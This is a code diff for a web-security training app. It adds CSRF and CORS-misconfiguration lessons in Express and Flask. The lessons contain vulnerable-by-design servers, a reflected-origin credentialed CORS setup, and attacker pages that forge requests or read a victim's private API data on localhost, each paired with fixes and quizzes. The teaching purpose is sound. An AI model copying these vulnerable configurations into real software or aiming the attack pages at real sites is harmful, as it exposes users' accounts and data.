+open "http://localhost:3000/account"        # observe: email is now attacker@evil.example
+\`\`\`
+
+**Expected observation:** visiting the attacker page silently changed the victim's email, because the browser attached the victim's session cookie to the cross-site POST. You never filled in a form. **That is CSRF.**
+
+**Defend it — two layers.** First, set \`SameSite=Lax\` on the session cookie (kills the cross-site POST):
+
+\`\`\`js
+res.cookie("session", "valid-session-for-victim", { httpOnly: true, sameSite: "lax", secure: false });
+// With SameSite=Lax, the browser will NOT attach this cookie to evil.com's cross-site POST,
+// so the victim route now sees no session and returns 401. Re-run the attack to confirm.
+\`\`\`
+
+Then add a **CSRF token** for defense-in-depth (and for \`SameSite=None\` cases):
+
+\`\`\`js
+import crypto from "crypto";
+// Issue a token tied to the session and embed it in your own forms:
+const tokens = new Map(); // sessionId -> csrfToken (use a real store in production)
+app.get("/account/form", (req, res) => {
+  const t = crypto.randomBytes(32).toString("hex");
+  tokens.set(req.cookies.session, t);
+  res.send(\`<form method="POST" action="/account/email">
+    <input type="hidden" name="_csrf" value="\${t}">
+    <input name="email"><button>Save</button></form>\`);
+});
+app.post("/account/email", (req, res) => {
+  if (req.cookies.session !== "valid-session-for-victim") return res.status(401).send("no");
+  // ✅ Require the token that only OUR page could have known (evil.com can't read it).
+  if (req.body._csrf !== tokens.get(req.cookies.session)) return res.status(403).send("bad csrf");
+  email = req.body.email;
+  res.send("email changed to " + email);
+});
+\`\`\`
+
+Re-run the attacker page: with \`SameSite=Lax\` the cookie isn't attached (401), and even without it, the missing/incorrect \`_csrf\` token yields 403. The attack is dead.
+
+### 🛡️ Defense: prove the request came from your own site
+
+- **Set \`SameSite\` on session cookies** (\`Lax\` as a sane default; \`Strict\` for the most sensitive). This alone defeats classic cross-site form/\`fetch\` POST CSRF.
+- **Use CSRF tokens for state-changing requests** (synchronizer token pattern), especially when you need \`SameSite=None\`, support old browsers, or want defense-in-depth. The attacker can't read the token because SOP blocks them reading your page.
+- **Never make state-changing GETs.** A GET that mutates can be triggered by an \`<img>\` tag and isn't covered by \`SameSite=Lax\`'s POST protection.
+- **Validate \`Origin\`/\`Referer\`** on sensitive requests as an extra check.
+- **Don't rely on "it's a JSON API."** Combine \`SameSite\` + tokens; verify your CORS config (Module 2.4) isn't reopening the door.
+
+**False-confidence traps:** "My API uses JSON, so CSRF can't happen" (CORS misconfig, form-encoded fallbacks, or GET state-changes can reopen it); "\`SameSite=Lax\` is set, so I don't need tokens" (state-changing GETs and \`SameSite=None\` widgets still need them — defense-in-depth); "the user has to be logged in for it to work, so it's low risk" (CSRF *targets* logged-in users — that's the whole point); "we check the cookie is valid" (the cookie *is* valid — it's the victim's; you must prove same-site origin, not cookie validity).
+
+### 💻 The same CSRF and two-layer fix in Python (Flask + Flask-WTF)
+
+The attacker page from the lab above is origin-agnostic — it doesn't care whether the victim app is Express or Flask, because the bug is the *server trusting a cookie without proving same-site origin*. Here is the vulnerable Flask victim and both defense layers.
+
+\`\`\`python
+# csrf_victim.py
+from flask import Flask, request, make_response
+app = Flask(__name__)
+email = "victim@example.com"
+
+@app.get("/login")
+def login():
+    resp = make_response("logged in")
+    resp.set_cookie("session", "valid-session-for-victim", httponly=True)  # note: no SameSite yet
+    return resp
+
+# ❌ VULNERABLE: trusts the cookie, but does NOT prove the request came from our site.
+@app.post("/account/email")
+def change_email():
+    global email
+    if request.cookies.get("session") != "valid-session-for-victim":
+        return "no", 401
+    email = request.form["email"]            # accepts an HTML form POST
+    return "email changed to " + email
+
+@app.get("/account")
+def account():
+    return "current email: " + email
+
+app.run(port=3000)
+\`\`\`
+
+The same \`attacker.html\` auto-submitting form (served on :8000) silently changes the email — the browser attaches the victim's session cookie to the cross-site POST. **Layer 1: set \`SameSite=Lax\`, which stops the cookie from riding cross-site POSTs:**
+
+\`\`\`python
+# ✅ Layer 1 — SameSite kills the classic cross-site form POST.
+resp.set_cookie("session", "valid-session-for-victim",
+                httponly=True, samesite="Lax", secure=False)  # secure=True in production
+\`\`\`
+
+**Layer 2: the synchronizer-token pattern.** You *can* hand-roll it (\`secrets.token_hex(32)\` stored per session, compared with \`hmac.compare_digest\`), but in real Flask apps you use **Flask-WTF**, which wires CSRF protection into every form and \`POST\` automatically:
+
+\`\`\`python
+# ✅ Layer 2 — Flask-WTF: app-wide CSRF tokens, the idiomatic defense.
+from flask_wtf import CSRFProtect
+app.secret_key = "load-from-env-not-source"   # required to sign tokens
+csrf = CSRFProtect(app)                        # now every state-changing request needs a valid token
+\`\`\`
+
+In your Jinja2 template you emit the token into your own form — a page on \`evil.com\` can't read it (SOP blocks cross-origin reads), so its forged POST is rejected with \`400 Bad Request\`:
+
+\`\`\`html
+<form method="POST" action="/account/email">
+  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+  <input name="email"><button>Save</button>
+</form>
+\`\`\`
+
+For a JSON/SPA API, Flask-WTF reads the token from the \`X-CSRFToken\` header instead; pair it with \`SameSite\` exactly as in the Node guidance. (Django ships the same protection built in via its \`CsrfViewMiddleware\` + \`{% csrf_token %}\` tag.)
+
+> **Why this matters in both languages.** Express needs \`cookie-parser\` + a token store you assemble; Flask gives you \`CSRFProtect\` and Django gives you middleware out of the box — but all three defend the *identical* gap: the cookie proves the user, never the origin. SameSite + a per-session token that \`evil.com\` cannot read is the universal answer.
+
+### Knowledge check: CSRF
+
+1. Which gap in the Same-Origin Policy makes CSRF possible?
+2. Why can't the server distinguish a CSRF request from a legitimate one just by checking the session cookie?
+3. Explain why an attacker on \`evil.com\` cannot read or forge a correct CSRF token.
+4. What does \`SameSite=Lax\` protect against, and what does it *not* protect against?
+5. Why is "my API is JSON" not a sufficient CSRF defense?
+
+<details>
+<summary>Show answers</summary>
+
+1. SOP stops cross-origin *reading* of responses but does **not** stop the browser from *sending* cross-origin requests — and cookies are auto-attached based on the destination, so a malicious site can trigger authenticated requests to your app.
+2. Because the cookie genuinely belongs to the victim and is valid; the request is authenticated. The server must instead verify the request *originated from its own site* (token/\`SameSite\`/Origin), which cookie validity alone can't establish.
+3. SOP prevents \`evil.com\`'s scripts from reading the contents of your pages, so the attacker can't obtain the random token your server embedded; without it, the forged request is rejected.
+4. \`SameSite=Lax\` stops the cookie from being attached on cross-site \`POST\`/\`fetch\`/iframe requests (classic CSRF). It does **not** protect state-changing *GET* navigations, doesn't apply to \`SameSite=None\` cookies, and isn't reliable on very old browsers — so tokens remain useful.
+5. JSON reduces the *simplest* form-based CSRF but isn't immunity: misconfigured CORS, endpoints that also accept form-encoded bodies, or GET-based state changes can reopen it. Use \`SameSite\` + CSRF tokens regardless.
+</details>
+
+➡️ **Next step:** CSRF defenses and many real bugs hinge on getting cross-origin sharing right. Misconfigure CORS and you hand attackers the cross-origin *reads* SOP was protecting. Continue to **Module 2.4: CORS Misconfiguration**.`,
+    tracker: ["Stood up csrf-victim.js + attacker.html on two origins and silently changed the victim's email", "Defended with SameSite=Lax and confirmed the cross-site POST is blocked", "Added the synchronizer CSRF token layer and saw the 403", "Read the Flask + Flask-WTF dual-language version", "Can explain why 'my API is JSON' is not a CSRF defense", "Answered the knowledge check"]
+  }, {
+    id: "m2-4",
+    phaseId: "p2",
+    num: "2.4",
+    title: "CORS Misconfiguration",
+    objective: "CORS is the security header full-stack developers most often misconfigure into a vulnerability while trying to make the API work cross-origin. A wrong config can grant attackers the cross-origin read access SOP exists to deny.",
+    body: `> **Why this matters.** CORS is the one security header full-stack developers most often *misconfigure into a vulnerability* — usually while trying to "just make the API work" with a frontend on another origin. A wrong CORS config doesn't merely fail open; it can actively *grant attackers the cross-origin read access that the Same-Origin Policy exists to deny*, exposing authenticated user data to any malicious site. The fix is precise and cheap once you understand what each header actually means.
+
+### 🎯 Concept: CORS is the server granting read permission, header by header
+
+Remember: SOP blocks cross-origin *reads* by default. CORS is the mechanism by which a server **opts specific other origins in** to reading its responses. The browser enforces it; the *server* configures it via response headers. The key headers:
+
+- **\`Access-Control-Allow-Origin\` (ACAO)** — names *which origin* is allowed to read the response. It can be a specific origin (\`https://app.example.com\`) or the wildcard \`*\` (any origin). This is the central decision.
+- **\`Access-Control-Allow-Credentials\` (ACAC)** — when \`true\`, tells the browser it may include **credentials** (cookies, HTTP auth) on the cross-origin request *and* let the calling page read the response. This is the dangerous flag: it's what allows *authenticated* cross-origin reads.
+- **Preflight (\`OPTIONS\`) requests** — for "non-simple" requests (custom headers, \`PUT\`/\`DELETE\`, \`application/json\` bodies), the browser first sends an \`OPTIONS\` "preflight" asking the server "are these method/headers allowed from my origin?" The server answers with \`Access-Control-Allow-Methods\`/\`-Headers\`/\`-Origin\`. Only if the preflight approves does the real request go. This is why a JSON API is *somewhat* shielded from simple CSRF (Module 2.3) — but it's also where misconfig hides.
+
+**The cardinal rule: \`*\` and credentials do not mix.** The browser *forbids* \`Access-Control-Allow-Origin: *\` together with \`Access-Control-Allow-Credentials: true\` — you cannot say "any origin may read authenticated responses," because that would let *every* website on the internet read your logged-in users' private data. So developers who want credentials reach for the dangerous workaround below.
+
+**The classic catastrophic misconfiguration — origin reflection.** To support credentials from "their" frontend, a developer writes code that *reflects whatever \`Origin\` the request sent* back into \`Access-Control-Allow-Origin\`, and sets credentials \`true\`:
+
+\`\`\`js
+app.use(cors({ origin: true, credentials: true }));   // ❌ reflects ANY origin
+\`\`\`
+
+\`origin: true\` means "echo back the requesting origin as allowed." Combined with \`credentials: true\`, this says: *any* website — including \`evil.com\` — may make credentialed (cookie-bearing) requests to your API **and read the responses.** So \`evil.com\` can, in the victim's logged-in browser, call your API and exfiltrate the victim's private data. **This is functionally as bad as having no SOP at all for your API.** It's the CORS equivalent of the CSRF bug, but worse, because now the attacker can *read* the response too, not just trigger an action.
+
+Other CORS pitfalls: trusting \`null\` origin (sent by sandboxed iframes/\`file://\` — attacker-spoofable), sloppy subdomain matching (\`endsWith('example.com')\` matches \`evilexample.com\`), or allowing \`*\` on endpoints that serve sensitive data even without credentials.
+
+### ⚔️ Hands-on: exfiltrate across origins through a reflected CORS config
+
+> **Ethics & scope.** Victim API and attacker page both run on *your machine*, different ports. You're demonstrating data theft from your own API to feel why reflected CORS is catastrophic. Never run cross-origin exfiltration against APIs you don't own.
+
+**Vulnerable API** — \`cors-victim.js\`:
+
+\`\`\`js
+import express from "express";
+import cors from "cors";
+import cookieParser from "cookie-parser";
+const app = express();
+app.use(cookieParser());
+app.use(cors({ origin: true, credentials: true }));   // ❌ THE BUG: reflect any origin + credentials
+
+app.get("/login", (req, res) => { res.cookie("session", "v", { httpOnly: false }); res.send("ok"); });
+app.get("/api/me", (req, res) => {
+  if (req.cookies.session !== "v") return res.status(401).json({ error: "no" });
+  res.json({ email: "victim@example.com", ssn: "PRETEND-PRIVATE-DATA" });  // private!
+});
+app.listen(3000, () => console.log("victim API on :3000"));
+\`\`\`
+
+**Attacker page** — \`cors-attacker.html\` (served on :8000):
+
+\`\`\`html
+<!doctype html>
+<html><body><h1>Free iPhone</h1>
+<script>
+  // From evil-origin, read the victim's PRIVATE API response cross-origin,
+  // because the API reflects our origin AND allows credentials.
+  fetch("http://localhost:3000/api/me", { credentials: "include" })
+    .then(r => r.json())
+    .then(d => { document.body.innerHTML += "<pre>STOLEN: " + JSON.stringify(d) + "</pre>"; });
+<\/script>
+</body></html>
+\`\`\`
+
+\`\`\`bash
+node cors-victim.js
+open "http://localhost:3000/login"            # victim logs in (cookie set)
+( cd "\$(dirname cors-attacker.html)"; python3 -m http.server 8000 >/dev/null 2>&1 & )
+open "http://localhost:8000/cors-attacker.html"   # attacker page reads victim's private data
+\`\`\`
+
+**Expected observation:** the attacker page, on a different origin, prints the victim's private \`email\`/\`ssn\` — it *read* an authenticated cross-origin response. SOP would normally forbid this; the reflected-origin + credentials CORS config explicitly permitted it. **This is why \`origin: true\` with credentials is a critical bug, not a convenience.**
+
+**Fix — allow-list exact origins:**
+
+\`\`\`js
+const allowedOrigins = new Set([
+  "https://app.example.com",
+  "https://admin.example.com",
+]);
+app.use(cors({
+  origin(origin, callback) {
+    // Allow same-origin/no-origin (curl, server-to-server) and EXACT matches only.
+    if (!origin || allowedOrigins.has(origin)) return callback(null, true);
+    return callback(new Error("Not allowed by CORS"));
+  },
+  credentials: true,
+}));
+\`\`\`
+
+Re-run the attacker page: the browser blocks the cross-origin read because \`http://localhost:8000\` isn't in the allow-list — the response is no longer readable by \`evil\`.
+
+### 🛡️ Defense: allow-list exact origins, never reflect, mind credentials
+
+- **Maintain an explicit allow-list of exact origins** (full scheme+host+port). Never reflect the request's \`Origin\` blindly; never use \`origin: true\` with credentials.
+- **Never combine \`Access-Control-Allow-Origin: *\` with credentials** (the browser blocks it — and wanting to is a signal you've designed the auth wrong).
+- **Match origins exactly**, not with \`endsWith\`/\`includes\` (which match attacker-controlled lookalikes like \`evilexample.com\` or \`app.example.com.evil.com\`).
+- **Don't trust the \`null\` origin.**
+- **Only enable CORS where you actually need cross-origin access**, and scope credentials to the minimum endpoints.
+- **Remember CORS is not authorization.** CORS decides who can *read responses in a browser*; it does nothing for non-browser clients (\`curl\` ignores it) and is not a substitute for server-side authentication/authorization (Phase 6).
+
+**False-confidence traps:** "\`origin: true\` just means 'allow my frontend'" (no — it reflects *any* origin; with credentials that's full cross-origin data theft); "CORS protects my API" (CORS is a *relaxation* of protection for browsers, and ignored entirely by non-browser clients — it's not access control); "I only allow \`*\`, no credentials, so it's safe" (then any site can read that endpoint's responses — fine for truly public data, a leak for anything sensitive); "I match with \`endsWith('example.com')\`" (matches \`notexample.com\`/\`example.com.evil.com\` — use exact equality).
+
+### 💻 The same reflected-origin bug and fix in Python (Flask + flask-cors)
+
+The catastrophic config — *reflect any origin + allow credentials* — is just as easy to write in Flask, and just as dangerous. The \`cors-attacker.html\` page from the lab reads the victim's private API response identically; only the server code changes.
+
+\`\`\`python
+# cors_victim.py
+from flask import Flask, request, jsonify, make_response
+from flask_cors import CORS
+app = Flask(__name__)
+
+# ❌ THE BUG: supports_credentials + reflecting any origin.
+# "*" cannot be combined with credentials, so developers reach for this:
+CORS(app, supports_credentials=True)   # default origins="*" gets REFLECTED per-origin when credentials are on
+
+@app.get("/login")
+def login():
+    resp = make_response("ok")
+    resp.set_cookie("session", "v")
+    return resp
+
+@app.get("/api/me")
+def me():
+    if request.cookies.get("session") != "v":
+        return jsonify(error="no"), 401
+    return jsonify(email="victim@example.com", ssn="PRETEND-PRIVATE-DATA")  # private!
+
+app.run(port=3000)
+\`\`\`
+
+\`\`\`bash
+pip install flask flask-cors
+python3 cors_victim.py
+open "http://localhost:3000/login"
+( cd "\$(dirname cors-attacker.html)"; python3 -m http.server 8000 >/dev/null 2>&1 & )
+open "http://localhost:8000/cors-attacker.html"   # reads the victim's private data cross-origin
+\`\`\`
+
+The attacker page on :8000 prints the victim's \`email\`/\`ssn\` — because flask-cors echoed back its origin and permitted credentials, exactly the catastrophe \`cors({ origin: true, credentials: true })\` produced in Node. **Fix: pass an explicit allow-list of exact origins; never reflect.**
+
+\`\`\`python
+# ✅ FIX: enumerate exact origins (scheme+host+port). flask-cors will only
+# emit Access-Control-Allow-Origin for an exact match; nothing else is reflected.
+CORS(
+    app,
+    resources={r"/api/*": {"origins": [
+        "https://app.example.com",
+        "https://admin.example.com",
+    ]}},
+    supports_credentials=True,
+)
+\`\`\`
+
+Two Python-specific pitfalls: do **not** pass \`origins="*"\` (or omit \`origins\`) while \`supports_credentials=True\` — the browser forbids \`*\`+credentials, which is the very reason people fall back to reflection. And flask-cors does exact-origin matching by default; if you ever supply a regex for \`origins\`, anchor it (\`r"^https://app\.example\.com$"\`) so \`app.example.com.evil.com\` can't slip through — the regex twin of the Node \`endsWith\` trap.
+
+> **Why this matters in both languages.** \`cors({ origin: true, credentials: true })\` in Express and \`CORS(app, supports_credentials=True)\` with a wildcard in Flask are the *same* bug wearing different syntax: reflecting the caller's origin while allowing cookies hands every website on the internet your logged-in users' data. The fix in both is an explicit, exact allow-list — and remembering that CORS is never a substitute for server-side authorization.
+
+### Knowledge check: CORS Misconfiguration
+
+1. What does CORS actually grant, and who enforces it vs. who configures it?
+2. Why does the browser forbid \`Access-Control-Allow-Origin: *\` together with credentials \`true\`?
+3. Explain precisely why \`cors({ origin: true, credentials: true })\` is a critical vulnerability.
+4. Is CORS a form of access control / authorization? Why or why not?
+5. What's wrong with validating origins using \`origin.endsWith("example.com")\`?
+
+<details>
+<summary>Show answers</summary>
+
+1. CORS grants *specific other origins* permission to **read cross-origin responses in a browser**. The **browser enforces** it; the **server configures** it via response headers (\`Access-Control-Allow-Origin\`, etc.).
+2. Because \`*\` means "any origin," and credentials mean "include the user's cookies and let the caller read the response." Together they'd let *every* website read your logged-in users' private data — so the browser refuses that combination.
+3. \`origin: true\` reflects whatever \`Origin\` the request carried back as allowed; with \`credentials: true\`, any site (including \`evil.com\`) can make cookie-authenticated requests to your API *and read the responses* in the victim's browser — exfiltrating private data. It effectively disables SOP for your API.
+4. No. CORS only governs whether a *browser* lets a page read a cross-origin response; non-browser clients (\`curl\`, servers) ignore it entirely. Real authorization must be enforced server-side per request regardless of CORS.
+5. \`endsWith("example.com")\` matches attacker-controlled hostnames like \`evilexample.com\` or \`example.com.evil.com\`, granting them access. Compare origins with exact equality against an allow-list.
+</details>
+
+➡️ **Next step:** You've secured the browser side — storage, XSS, CSRF, CORS. Now move to the server, where trust is actually enforced: hardening Express, killing SQL injection, and locking down APIs and uploads. Continue to **Phase 3: Backend, API, and Database Security**.`,
+    tracker: ["Stood up cors-victim.js + cors-attacker.html and exfiltrated private data cross-origin", "Fixed it with an exact-origin allow-list and confirmed the read is blocked", "Read the Flask + flask-cors dual-language version (including the anchored-regex pitfall)", "Can explain why * and credentials cannot mix", "Can explain why CORS is not authorization", "Answered the knowledge check"]
   }],
 
   // ---- end migrated AppSec data ----
@@ -5078,9 +5840,11 @@ function App() {
     try {
       const fromHash = (location.hash || "").replace(/^#/, "");
       if (fromHash && curriculum.modules.some(m => m.id === fromHash)) return fromHash;
-      return localStorage.getItem("cg-active") || "m0";
+      const saved = localStorage.getItem("cg-active");
+      if (saved && curriculum.modules.some(m => m.id === saved)) return saved;
+      return curriculum.modules[0].id;
     } catch {
-      return "m0";
+      return curriculum.modules[0].id;
     }
   };
   const [activeModuleId, setActiveModuleId] = useState(initialId);
@@ -5092,12 +5856,12 @@ function App() {
       return {};
     }
   });
-  const [expandedLevels, setExpandedLevels] = useState(() => ({
-    0: true,
-    1: true,
-    2: false,
-    3: false
-  }));
+  // Phase groups start expanded; users can collapse any. Keyed by phase id (e.g. "p0").
+  const [expandedLevels, setExpandedLevels] = useState(() => {
+    const init = {};
+    (curriculum.phases || []).forEach((p, i) => { init[p.id] = i < 2; });
+    return init;
+  });
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [searchQuery, setSearchQuery] = useState("");
   const mainRef = useRef(null);
@@ -5136,7 +5900,7 @@ function App() {
   // Build search index over all module text content
   const searchIndex = useMemo(() => {
     return curriculum.modules.map(m => {
-      const blob = [m.num, m.title, m.objective || "", m.theory || "", (m.challenges || []).map(c => c.q + " " + c.a).join(" "), (m.quiz || []).join(" "), (m.tracker || []).join(" "), m.caseStudy ? m.caseStudy.title + " " + m.caseStudy.body : "", m.lab ? Object.values(m.lab).join(" ") : ""].join(" ").toLowerCase();
+      const blob = [m.num, m.title, m.objective || "", m.body || "", (m.tracker || []).join(" ")].join(" ").toLowerCase();
       return {
         id: m.id,
         num: m.num,
@@ -5226,7 +5990,6 @@ function App() {
     return sum + Object.values(tr).filter(Boolean).length;
   }, 0);
   const overallPercent = totalTrackerItems ? Math.round(completedTrackerItems / totalTrackerItems * 100) : 0;
-  const currentLevelModules = curriculum.modules.filter(m => m.level === activeModule.level);
   const currentIdx = curriculum.modules.findIndex(m => m.id === activeModuleId);
   const prevModule = currentIdx > 0 ? curriculum.modules[currentIdx - 1] : null;
   const nextModule = currentIdx < curriculum.modules.length - 1 ? curriculum.modules[currentIdx + 1] : null;
@@ -5261,32 +6024,29 @@ function App() {
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
-    a.download = `cyber-guardians-progress-${new Date().toISOString().split("T")[0]}.json`;
+    a.download = `appsec-progress-${new Date().toISOString().split("T")[0]}.json`;
     a.click();
     URL.revokeObjectURL(url);
   };
-  const levelColorStyle = levelId => {
-    const level = curriculum.levels.find(l => l.id === levelId);
-    if (!level) return {};
+  const phaseColorStyle = phaseId => {
+    const phase = curriculum.phases.find(p => p.id === phaseId);
+    if (!phase) return {};
     return {
-      backgroundColor: `color-mix(in srgb, var(${level.colorVar}) 15%, transparent)`,
-      color: `var(${level.colorVar})`,
-      borderColor: `color-mix(in srgb, var(${level.colorVar}) 40%, transparent)`
+      backgroundColor: `color-mix(in srgb, var(${phase.colorVar}) 15%, transparent)`,
+      color: `var(${phase.colorVar})`,
+      borderColor: `color-mix(in srgb, var(${phase.colorVar}) 40%, transparent)`
     };
   };
-  const levelGroups = [{
-    id: 0,
-    name: "Setup",
-    modules: curriculum.modules.filter(m => m.level === 0),
-    weeks: "Start here"
-  }, ...curriculum.levels.map(lvl => ({
-    id: lvl.id,
-    name: lvl.name,
-    tagline: lvl.tagline,
-    colorVar: lvl.colorVar,
-    weeks: lvl.weeks,
-    modules: curriculum.modules.filter(m => m.level === lvl.id)
-  }))];
+  // Sidebar groups: one collapsible group per phase, in declared order, holding that phase's modules.
+  const phaseGroups = curriculum.phases.map(p => ({
+    id: p.id,
+    name: p.name,
+    short: p.short,
+    tagline: p.tagline,
+    colorVar: p.colorVar,
+    weeks: p.weeks,
+    modules: curriculum.modules.filter(m => m.phaseId === p.id)
+  }));
   return /*#__PURE__*/React.createElement("div", {
     className: "min-h-screen flex flex-col"
   }, /*#__PURE__*/React.createElement("header", {
@@ -5331,7 +6091,7 @@ function App() {
     }
   }, "\uD83D\uDEE1\uFE0F"), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h1", {
     className: "text-base font-semibold tracking-tight text-white glow-text"
-  }, "Cyber Guardians"), /*#__PURE__*/React.createElement("p", {
+  }, curriculum.title), /*#__PURE__*/React.createElement("p", {
     className: "text-xs text-[#9aa5b8] hidden sm:block"
   }, curriculum.subtitle)))), /*#__PURE__*/React.createElement("div", {
     className: "flex items-center gap-4 flex-1 max-w-md"
@@ -5416,7 +6176,7 @@ function App() {
     className: `sidebar border-r border-[#273042] bg-[#0a0e17] lg:sticky lg:top-[69px] lg:self-start lg:h-[calc(100vh-69px)] overflow-y-auto w-80 shrink-0 ${sidebarOpen ? "open" : ""}`
   }, /*#__PURE__*/React.createElement("nav", {
     className: "p-4 pb-12"
-  }, levelGroups.map(group => {
+  }, phaseGroups.map(group => {
     const isExpanded = expandedLevels[group.id] !== false;
     const groupComplete = group.modules.every(m => isModuleComplete(m.id));
     return /*#__PURE__*/React.createElement("div", {
@@ -5445,8 +6205,11 @@ function App() {
     }, /*#__PURE__*/React.createElement("div", {
       className: "flex items-center gap-2"
     }, /*#__PURE__*/React.createElement("span", {
-      className: `text-sm font-semibold ${group.id === 0 ? "text-[#e8ecf2]" : "text-white"}`
-    }, group.id === 0 ? "Setup" : `Level ${group.id} — ${group.name}`), groupComplete && group.modules.length > 0 && /*#__PURE__*/React.createElement("span", {
+      className: "inline-block w-2 h-2 rounded-full shrink-0",
+      style: { backgroundColor: `var(${group.colorVar})` }
+    }), /*#__PURE__*/React.createElement("span", {
+      className: "text-sm font-semibold text-white"
+    }, group.short || group.name), groupComplete && group.modules.length > 0 && /*#__PURE__*/React.createElement("span", {
       className: "text-xs text-[#34d399]"
     }, "\u2713")), /*#__PURE__*/React.createElement("div", {
       className: "text-xs text-[#6b7790] truncate"
@@ -5482,75 +6245,18 @@ function App() {
     className: "flex items-center gap-2 mb-3 flex-wrap"
   }, /*#__PURE__*/React.createElement("span", {
     className: "level-badge",
-    style: activeModule.level === 0 ? {
-      background: "#273042",
-      color: "#9aa5b8",
-      borderWidth: "1px",
-      borderStyle: "solid",
-      borderColor: "#384661"
-    } : levelColorStyle(activeModule.level)
-  }, activeModule.level === 0 ? "Setup" : `Level ${activeModule.level} · ${curriculum.levels[activeModule.level - 1]?.name}`), /*#__PURE__*/React.createElement("span", {
+    style: phaseColorStyle(activeModule.phaseId)
+  }, (curriculum.phases.find(p => p.id === activeModule.phaseId)?.short) || (curriculum.phases.find(p => p.id === activeModule.phaseId)?.name) || "Module"), /*#__PURE__*/React.createElement("span", {
     className: "text-xs font-mono text-[#6b7790]"
   }, activeModule.num)), /*#__PURE__*/React.createElement("h1", {
     className: "text-3xl lg:text-4xl font-bold tracking-tight text-white mb-3 leading-tight"
   }, activeModule.title), /*#__PURE__*/React.createElement("p", {
     className: "text-[#9aa5b8] text-lg leading-relaxed"
-  }, activeModule.objective)), activeModule.theory && /*#__PURE__*/React.createElement("section", {
+  }, activeModule.objective)), activeModule.body && /*#__PURE__*/React.createElement("section", {
     className: "mb-10"
-  }, /*#__PURE__*/React.createElement(SectionHeading, {
-    icon: "\uD83D\uDCD8",
-    title: "Theory"
-  }), /*#__PURE__*/React.createElement(Prose, {
-    text: activeModule.theory
-  })), activeModule.lab && /*#__PURE__*/React.createElement("section", {
-    className: "mb-10"
-  }, /*#__PURE__*/React.createElement(SectionHeading, {
-    icon: "\uD83D\uDEE0\uFE0F",
-    title: "Lab \u2014 Hands On"
-  }), /*#__PURE__*/React.createElement("p", {
-    className: "text-[#9aa5b8] text-sm mb-4"
-  }, "Commands for your platform. Switch OS to see your version."), /*#__PURE__*/React.createElement(OSTabs, {
-    lab: activeModule.lab
-  })), activeModule.caseStudy && /*#__PURE__*/React.createElement("section", {
-    className: "mb-10"
-  }, /*#__PURE__*/React.createElement(SectionHeading, {
-    icon: "\uD83C\uDF0D",
-    title: "Real-World Case Study"
-  }), /*#__PURE__*/React.createElement("div", {
-    className: "callout warning"
-  }, /*#__PURE__*/React.createElement("div", {
-    className: "text-[#fbbf24] text-sm font-semibold mb-2"
-  }, activeModule.caseStudy.title), /*#__PURE__*/React.createElement("p", {
-    className: "text-[#e8ecf2] leading-relaxed"
-  }, activeModule.caseStudy.body))), activeModule.challenges && activeModule.challenges.length > 0 && /*#__PURE__*/React.createElement("section", {
-    className: "mb-10"
-  }, /*#__PURE__*/React.createElement(SectionHeading, {
-    icon: "\uD83E\uDDE9",
-    title: "Try It Yourself"
-  }), /*#__PURE__*/React.createElement("p", {
-    className: "text-[#9aa5b8] text-sm mb-4"
-  }, "Attempt each challenge before revealing the solution. The discipline of struggling first is what builds real skill."), activeModule.challenges.map((c, i) => /*#__PURE__*/React.createElement(Challenge, {
-    key: i,
-    q: c.q,
-    a: c.a,
-    index: i
-  }))), activeModule.quiz && activeModule.quiz.length > 0 && /*#__PURE__*/React.createElement("section", {
-    className: "mb-10"
-  }, /*#__PURE__*/React.createElement(SectionHeading, {
-    icon: "\u2753",
-    title: "Self-Assessment"
-  }), /*#__PURE__*/React.createElement("p", {
-    className: "text-[#9aa5b8] text-sm mb-4"
-  }, "Answer out loud or in your journal. No peeking."), /*#__PURE__*/React.createElement("ol", {
-    className: "space-y-3"
-  }, activeModule.quiz.map((q, i) => /*#__PURE__*/React.createElement("li", {
-    key: i,
-    className: "flex gap-3 px-5 py-3 bg-[#121826] border border-[#273042] rounded-lg"
-  }, /*#__PURE__*/React.createElement("span", {
-    className: "text-[#22d3ee] font-mono text-sm shrink-0"
-  }, "Q", i + 1), /*#__PURE__*/React.createElement("p", {
-    className: "text-[#e8ecf2] leading-relaxed"
-  }, q))))), activeModule.tracker && activeModule.tracker.length > 0 && /*#__PURE__*/React.createElement("section", {
+  }, /*#__PURE__*/React.createElement(Prose, {
+    text: activeModule.body
+  })), activeModule.tracker && activeModule.tracker.length > 0 && /*#__PURE__*/React.createElement("section", {
     className: "mb-10"
   }, /*#__PURE__*/React.createElement(SectionHeading, {
     icon: "\u2705",
@@ -5604,7 +6310,7 @@ function App() {
     className: "text-sm truncate max-w-[140px] sm:max-w-[220px]"
   }, nextModule?.title || "—")), /*#__PURE__*/React.createElement("span", null, "\u2192"))), /*#__PURE__*/React.createElement("div", {
     className: "mt-16 pt-8 border-t border-[#273042] text-center text-xs text-[#6b7790]"
-  }, "Cyber Guardians \xB7 Progress saved locally in your browser \xB7 ", /*#__PURE__*/React.createElement("span", {
+  }, curriculum.title, " \xB7 Progress saved locally in your browser \xB7 ", /*#__PURE__*/React.createElement("span", {
     className: "font-mono"
   }, "v1.0"))))));
 }
